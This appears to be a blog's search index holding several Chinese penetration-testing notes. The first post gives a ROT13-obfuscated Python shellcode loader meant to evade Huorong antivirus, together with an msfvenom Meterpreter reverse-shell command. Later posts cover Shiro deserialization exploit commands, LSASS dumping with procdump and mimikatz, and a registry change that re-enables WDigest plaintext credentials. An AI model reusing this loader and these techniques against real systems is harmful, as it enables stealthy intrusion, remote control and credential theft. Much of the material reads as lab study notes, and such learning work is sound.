<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>python免杀火绒</title>
    <url>/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</url>
    <content><![CDATA[<p>sd</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"># 定义 ROT13 函数，用于加密/解密</span><br><span class="line">def rot13(message):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    for item in message:</span><br><span class="line">        if (ord(item)&gt;= ord(&#x27;A&#x27;) and ord(item)&lt;= ord(&#x27;M&#x27;)) or (ord(item)&gt;= ord(&#x27;a&#x27;) and ord(item)&lt;= ord(&#x27;m&#x27;)):</span><br><span class="line">            res += chr(ord(item)+13)</span><br><span class="line">        elif (ord(item)&gt;= ord(&#x27;N&#x27;) and ord(item)&lt;= ord(&#x27;Z&#x27;)) or (ord(item)&gt;= ord(&#x27;n&#x27;) and ord(item)&lt;= ord(&#x27;z&#x27;)):</span><br><span class="line">            res += chr(ord(item)-13)</span><br><span class="line">        else:</span><br><span class="line">            res += item</span><br><span class="line">    return res</span><br><span class="line"># 定义 shellcode，这是一个二进制可执行代码，填入shellcode</span><br><span class="line">shellcode=&#x27;&#x27;</span><br><span class="line"># 解析十六进制shellcode并转换为字节对象</span><br><span class="line"></span><br><span class="line">shellcode = bytes.fromhex(shellcode)</span><br><span class="line"></span><br><span class="line"># 定义 ROT13 加密的加载器字符串</span><br><span class="line">loader = &quot;pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)&quot;</span><br><span class="line">exec (rot13(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先用msf生成shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.18.229.138 LPORT=4399 -f c</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412145238858.png" alt="image-20230412145238858"></p>
<p>然后对shellcode进行处理</p>
<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152420499.png" alt="image-20230412152420499"></p>
<p>用转换.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in open(&#x27;shellcode_RAW.txt&#x27;):</span><br><span class="line">    i = i.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;\\x&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;&quot;&#x27;,&#x27;&#x27;)</span><br><span class="line">    i = i.replace(&#x27;;&#x27;,&#x27;&#x27;)</span><br><span class="line">    with open(r&#x27;shellcode.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">        f.write(i)</span><br></pre></td></tr></table></figure>

<p>过火绒<img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412152823295.png" alt="image-20230412152823295"></p>
<p>启动</p>
<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155717923.png" alt="image-20230412155717923"></p>
<p>打开监听</p>
<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155822903.png" alt="image-20230412155822903"></p>
<p>成功</p>
<p><img src="/2023/04/12/python%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20230412155910803.png" alt="image-20230412155910803"></p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle_padding原理学习</title>
    <url>/2023/04/11/oracle_padding%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>挖个坑先，以后再填（大概）</p>
<span id="more"></span>

<p><a href="http://blog.topsec.com.cn/padding-oracle%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">http://blog.topsec.com.cn/padding-oracle%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</a></p>
]]></content>
  </entry>
  <entry>
    <title>shiro-721总结</title>
    <url>/2023/04/10/shiro-721%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="什么是shiro-721"><a href="#什么是shiro-721" class="headerlink" title="什么是shiro-721"></a>什么是shiro-721</h2><p>shiro-721是1.4.2之前版本中存在的漏洞，是由于shiro cookie中通过<strong>AES-128-CBC</strong>模式加密的rememberMe字段存在问题，用户通过<strong>Padding Oracle</strong>攻击生成的攻击代码来构造恶意的rememberMe字段，造成任意代码执行。</p>
<span id="more"></span>

<p>注意：shiro-721攻击的前提是先登录后台获取一个合法cookie</p>
<h2 id="什么是padding-oracle"><a href="#什么是padding-oracle" class="headerlink" title="什么是padding oracle"></a>什么是padding oracle</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding表示填充，oracle表示提示(不是甲骨文哈)，在解密的时候，如果算法发现解密后数据的填充方式不符合规则，那么就表示输入数据有问题，那么解密的类库就会抛出一个异常，提示输入数据的padding不对。</span><br><span class="line"></span><br><span class="line">shiro中出现padding oracle漏洞的是CBC加密模式，CBC加密模式是密码学5种加密模式中的一种(ECB、CBC、CFB、OFB、CTR)，意思是密码块链模式(Cipher Block Chaining)，简单来说就是在加密之前会设置一个初始向量IV，IV先与第一个明文分组异或，然后使用密钥加密得到第一个分组的密文，然后依次将每一个明文分组与前一个分组的密文进行异或后再进行密钥加密。由于CBC有一个随机的初始变量，那么相同的明文每次经过CBC加密模式的加密结果是不同的，但是CBC存在设计缺陷，造成padding oracle攻击。</span><br><span class="line"></span><br><span class="line">【漏洞点：客户端发送加密数据，服务器端会解密数据，然后进行一个回显，反映解密成功与否。服务器的回显总归是有些危险的，我们可以以回显差异来判断我们的输入是否正确，这也是padding oracle攻击的利用点。】</span><br><span class="line"></span><br><span class="line">以AES/DES为例，AES的分组长度为128bit(16字节)，DES每块为8个字节，但并不是每一段明文都可以刚好被16或8整除，那么就需要用到一些强制措施将明文补充到16或8的倍数，最直接的就是直接填充(padding)。</span><br><span class="line"></span><br><span class="line">那么怎么才能有意义的填充？CBC模式的设计者就考虑到这个问题，以DES为例，假设DES按8个字节分为明文分组，那么CBC的填充方法就是缺了1位(即明文7个字节)就填一个0x01，缺了2位(即明文6个字节)就填2个0x02，缺了3位就填3个0x03......需要注意的是即使明文正好是分组的整数倍，也会再填充8个0x08。服务器端在解密的时候，其实就是加密过程反过来。</span><br><span class="line"></span><br><span class="line">加密流程：iv初始向量异或第一组明文-&gt;用密钥加密第一组明文-&gt;上一组密文和当前明文异或-&gt;......-&gt;最后一个明文分组缺n位就填充n位0x0n。</span><br><span class="line"></span><br><span class="line">解密流程：解密密文的第一分组-&gt;解密得到iv和第一段明文异或的结果(中间值)-&gt;中间值和iv再异或一次就得到了第一组的明文-&gt;......直到解密完最后一组密文。</span><br><span class="line"></span><br><span class="line">这个时候按理说服务器端会将解密后的数据交给业务逻辑进行后续的判断执行，但是实际上中间还有一个步骤，程序会判断明文最后的填充位是否正确。这个判断本身没有问题，反而可以过滤掉一些错误的、被恶意篡改的加密数据，但是判断出明文最后的一个分组的填充位是错误的之后，返回给客户端的信息，会被攻击者利用。</span><br><span class="line"></span><br><span class="line">a. 如果密文解密成明文后，填充位判断正确，而且经过业务逻辑代码的校验后，也是正确，那么服务端会返回200的状态码。</span><br><span class="line"></span><br><span class="line">b. 如果密文解密成明文后，填充位判断正确，但是业务逻辑判断不通过，也就是说这个明文有问题，那么服务端会返回200或者300等状态码。</span><br><span class="line"></span><br><span class="line">c. 如果密文解密成明文后，填充位判断不正确，就会返回500等状态码。</span><br><span class="line"></span><br><span class="line">总结起来就是，明文填充位的正确与否，服务器端返回的状态码不一样，padding oracle正是通过这一点进行漏洞利用。</span><br><span class="line">具体见参考文章二</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境：vulfocus</p>
<p>影响版本：&lt;1.4.2</p>
<p>先用给出的密码登录以此生成cookie</p>
<p>然后刷新抓包</p>
<p><img src="/2023/04/10/shiro-721%E6%80%BB%E7%BB%93/image-20230411160949005.png" alt="image-20230411160949005"></p>
<p>然后复制rememberMe字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &quot;ls/tmp&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shiro_exp.py http://123.58.224.8:62497/ rememberMe字段 payload.class</span><br></pre></td></tr></table></figure>

<p>没弄出来，寄</p>
<p><img src="/2023/04/10/shiro-721%E6%80%BB%E7%BB%93/image-20230411164816506.png" alt="image-20230411164816506"></p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/vuls/347628.html">https://www.freebuf.com/vuls/347628.html</a></p>
<p><a href="http://blog.topsec.com.cn/padding-oracle%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">http://blog.topsec.com.cn/padding-oracle%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro总结（shiro-550）</title>
    <url>/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/</url>
    <content><![CDATA[<h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><p>shiro-550、shiro-721</p>
<h2 id="什么是shiro？"><a href="#什么是shiro？" class="headerlink" title="什么是shiro？"></a>什么是shiro？</h2><p><strong>Apache Shiro</strong>框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p>
<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/1654678054_62a0622634db0bc5f79c4.jpeg" alt="1654678054_62a0622634db0bc5f79c4.png!small?1654678055051"></p>
<span id="more"></span>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密</p>
<p>加密过程:</p>
<p><strong>用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。</strong></p>
<p>如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。</p>
<p>在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>

<p>，这就更容易触发RCE漏洞。</p>
<p>生成Payload过程：</p>
<p><strong>恶意命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。</strong></p>
<h2 id="漏洞的验证与判断（CVE-2016-4437-x2F-shiro-550）"><a href="#漏洞的验证与判断（CVE-2016-4437-x2F-shiro-550）" class="headerlink" title="漏洞的验证与判断（CVE-2016-4437&#x2F;shiro-550）"></a>漏洞的验证与判断（CVE-2016-4437&#x2F;shiro-550）</h2><ol>
<li>未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</li>
<li>登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段</li>
<li>不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段</li>
<li>勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</li>
<li>或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</li>
</ol>
<h2 id="shiro密钥获取方式"><a href="#shiro密钥获取方式" class="headerlink" title="shiro密钥获取方式"></a>shiro密钥获取方式</h2><p>在1.2.4版本之前，shiro中使用默认AES密钥(CBC模式)，硬编码的key为经过base64编码后的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>

<p>，使用时要先base64解码。</p>
<p>在1.2.4版本之后，修复为自定义AES密钥(CBC模式)，这时需要获取到key才可以开始渗透，可以通过google、github进行搜索来收集常用的github中的key值。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境：VUKFOCUS</p>
<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/image-20230410155928746.png" alt="image-20230410155928746"></p>
<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/image-20230410155945534.png" alt="image-20230410155945534"></p>
<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/image-20230410160150456.png" alt="image-20230410160150456">用shiro_attack</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar shiro_attack-2.2.jar</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/image-20230410161356302.png" alt="image-20230410161356302"></p>
<p>一个个试利用链</p>
<p>最后搞到flag</p>
<p><img src="/2023/04/10/shiro%E6%80%BB%E7%BB%93%EF%BC%88shiro-550%EF%BC%89/image-20230410161432770.png" alt="image-20230410161432770"></p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
<p><a href="https://www.freebuf.com/vuls/347628.html">https://www.freebuf.com/vuls/347628.html</a></p>
<p><a href="https://www.freebuf.com/vuls/178014.html">https://www.freebuf.com/vuls/178014.html</a></p>
<p><a href="https://blog.csdn.net/Fighting_hawk/article/details/125562498#1__1">https://blog.csdn.net/Fighting_hawk/article/details/125562498#1__1</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>护网蓝队笔记</title>
    <url>/2023/04/05/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="工具特征"><a href="#工具特征" class="headerlink" title="工具特征"></a>工具特征</h2><p>冰蝎 大量请求头 默认 16 个 ua </p>
<p>菜刀 asp php 有明文传授 2016 后版本有加密和混淆 但部分高危和关键函数没有，如 ini eval assert </p>
<p>哥斯拉 可以绕大部分静态，但他 有一个 http 响应为空 且执行回显为固定内容</p>
<span id="more"></span>

<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>从当时的日志和蜜罐获取 ip 或 vps 信息，</p>
<p>负载均衡 cdn dnsinfo 看 xff 或 refer</p>
<p>有图标 icon 转哈希黑暗引擎搜 </p>
<h2 id="挖矿病毒检测"><a href="#挖矿病毒检测" class="headerlink" title="挖矿病毒检测"></a>挖矿病毒检测</h2><p>1.从第一个协议包检测，如登陆包、提交包会有测点信息 </p>
<p>2.从流量里还原文件然后将文件放到沙箱中检测</p>
<p>3.主机异常，一般攻击者会横向</p>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>00 截断 结束符 适用于 c php</p>
<p>反弹 shell nc -lvvp 端口</p>
<p>查注册表或隐藏文件找用户</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>护网</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSlog</title>
    <url>/2023/03/30/DNSlog/</url>
    <content><![CDATA[<p> DNSLOG是一种回显机制，常用于在某些漏洞无法回显但可以发起DNS请求的情况下，利用此方式外带数据，以解决某些漏洞由于无回显而难以利用的问题。主要利用场景有SQL盲注、无回显的命令执行、无回显的SSRF。</p>
<span id="more"></span>

<p><img src="/2023/03/30/DNSlog/1614164845_6036336de4817f724b780.jpeg" alt="dnllog原理图"></p>
<p>参考文章 ：</p>
<p><a href="https://www.freebuf.com/articles/network/237795.html">https://www.freebuf.com/articles/network/237795.html</a></p>
<p><a href="https://www.freebuf.com/vuls/264266.html">https://www.freebuf.com/vuls/264266.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title>域横移之IPC连接</title>
    <url>/2023/03/23/%E5%9F%9F%E6%A8%AA%E7%A7%BB%E4%B9%8BIPC%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Internet Process Connection) 共享“命名管道”的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
<p> 通过IPC$,可以域目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
<span id="more"></span>

<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li><p>开启139和445端口</p>
<p>445端口可以实现远程登录及时默认共享资源的访问，而139端口的开启表示NETBIOS的协议的应用。通过139、445端口，可以实现对共享文件&#x2F;打印机的访问。因此，一般来说，ipc需要139、445端口的支持。</p>
</li>
<li><p>管理员开启了默认共享</p>
<p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c、 d 、e等 ) 和系统目录 winnt 和 windows 。通过 ipc 等)和系统目录winnt和windows。通过ipc等和系统目录winnt和windows。通过ipc,可以实现对这些默认共享目录的访问。</p>
</li>
</ol>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_38675102/article/details/128506074">https://blog.csdn.net/qq_38675102/article/details/128506074</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>procdump+mimikatz配合获取密码</title>
    <url>/2023/03/21/%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>微软procdump下载地址：</p>
<p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">ProcDump - Sysinternals | Microsoft Learn</a></p>
<p>将procdump上传至靶机，或直接在靶机上下载，注意有可能要做免杀，虽然它是微软官方软件但是有些杀软照杀不误（360）.</p>
<span id="more"></span>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81/image-20230321143258349-1679380384694-1.png" alt="image-20230321143258349"></p>
<p><img src="/2023/03/21/%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81/image-20230321143324133.png" alt="image-20230321143324133"></p>
<p>这里环境是最新win11，开火绒</p>
<p>然后将 lsass.dmp转移到主机mimikatz主文件夹中</p>
<p>先提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>

<p>管理员权限打开shell</p>
<p><img src="/2023/03/21/%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81/image-20230321144047527.png" alt="image-20230321144047527"></p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp </span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<p>报错：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</p>
<p>这里是高版本window，在 Windows Vista 系统之后不再存储 LM HASH，而 Windows 8.1 系统之后内存中也不再存储明文密码，因此在高版本 Windows 系统中无法利用 Mimikatz 直接读取明文密码。Mimikatz 能获取明文密码的关键是 wdigest。</p>
<p>这是一个可逆算法，相关注册表存储位置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &quot;UseLogonCredential&quot;（DWORD）</span><br></pre></td></tr></table></figure>

<p>后续高版本的 Windows 系统不能读取明文是因为关闭了该注册表键，如果想要重新获取明文，只需要开启该注册表后再输入密码重新登录即可（注销或重启）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>常见端口总结</title>
    <url>/2023/03/15/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>常见端口：{‘21’,’22’,’135’,’443’,’445’,’80’,’1433’,’3306’,”3389”,’1521’,’8000’,’7002’,’7001’,’8080’,”9090”,’8089’,’4848’}</p>
<span id="more"></span>

<h3 id="1-web类-web漏洞-x2F-敏感目录"><a href="#1-web类-web漏洞-x2F-敏感目录" class="headerlink" title="1,web类(web漏洞&#x2F;敏感目录)"></a>1,web类(web漏洞&#x2F;敏感目录)</h3><p>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
<p>80 web </p>
<p>80-89 web </p>
<p>8000-9090 web</p>
<h3 id="2-数据库类-扫描弱口令"><a href="#2-数据库类-扫描弱口令" class="headerlink" title="2,数据库类(扫描弱口令)"></a>2,数据库类(扫描弱口令)</h3><p>1433 MSSQL </p>
<p>1521 Oracle </p>
<p>3306 MySQL </p>
<p>5432 PostgreSQL </p>
<h3 id="3-特殊服务类-未授权-x2F-命令执行类-x2F-漏洞"><a href="#3-特殊服务类-未授权-x2F-命令执行类-x2F-漏洞" class="headerlink" title="3,特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)"></a>3,特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</h3><p>443 SSL心脏滴血 </p>
<p>873 Rsync未授权 </p>
<p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p>
<p>6379 redis未授权 </p>
<p>7001,7002 WebLogic默认弱口令，反序列 </p>
<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p>
<p>11211 memcache未授权访问 </p>
<p>27017,27018 Mongodb未授权访问 </p>
<p>50000 SAP命令执行 </p>
<p>50070,50030 hadoop默认端口未授权访问</p>
<h3 id="4-常用端口类-扫描弱口令-x2F-端口爆破"><a href="#4-常用端口类-扫描弱口令-x2F-端口爆破" class="headerlink" title="4,常用端口类(扫描弱口令&#x2F;端口爆破)"></a>4,常用端口类(扫描弱口令&#x2F;端口爆破)</h3><p>21 ftp </p>
<p>22 SSH </p>
<p>23 Telnet </p>
<p>2601,2604 zebra路由，默认密码zebra</p>
<p>3389 远程桌面</p>
<p>端口合计详情</p>
<h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line"></span><br><span class="line">22 SSH </span><br><span class="line"></span><br><span class="line">23 Telnet </span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line"></span><br><span class="line">80-89 web </span><br><span class="line"></span><br><span class="line">161 SNMP </span><br><span class="line"></span><br><span class="line">389 LDAP </span><br><span class="line"></span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试  </span><br><span class="line"></span><br><span class="line">445 SMB </span><br><span class="line"></span><br><span class="line">512,513,514 Rexec </span><br><span class="line"></span><br><span class="line">873 Rsync未授权 </span><br><span class="line"></span><br><span class="line">1025,111 NFS </span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line"></span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"></span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line"></span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line"></span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"></span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line"></span><br><span class="line">3306 MySQL </span><br><span class="line"></span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line"></span><br><span class="line">3389 远程桌面 </span><br><span class="line"></span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line"></span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">5900 vnc </span><br><span class="line"></span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line"></span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line"></span><br><span class="line">6379 redis未授权 </span><br><span class="line"></span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line"></span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line"></span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line"></span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令 </span><br><span class="line"></span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"></span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line"></span><br><span class="line">8649 ganglia </span><br><span class="line"></span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line"></span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line"></span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line"></span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line"></span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line"></span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line"></span><br><span class="line">50000 SAP命令执行 </span><br><span class="line"></span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title>烂土豆(RottenPotato)web提权system</title>
    <url>/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/</url>
    <content><![CDATA[<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p><strong>什么是令牌？</strong></p>
<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
<span id="more"></span>

<p><strong>令牌种类</strong></p>
<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象 。<br>会话令牌(Session Token)：是交互会话中唯一的身份标识符。<br>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身 份校验的物理设备，例如 U 盾。<br>      Windows 的 AccessToken 有两种类型：</p>
<p>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接 登录、远程桌面登录访问)<br>Impresonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)。<br>      （注：<code>两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation，依旧有效</code>。）<br><strong>窃取过程</strong></p>
<p>1.生成msf的后门shell</p>
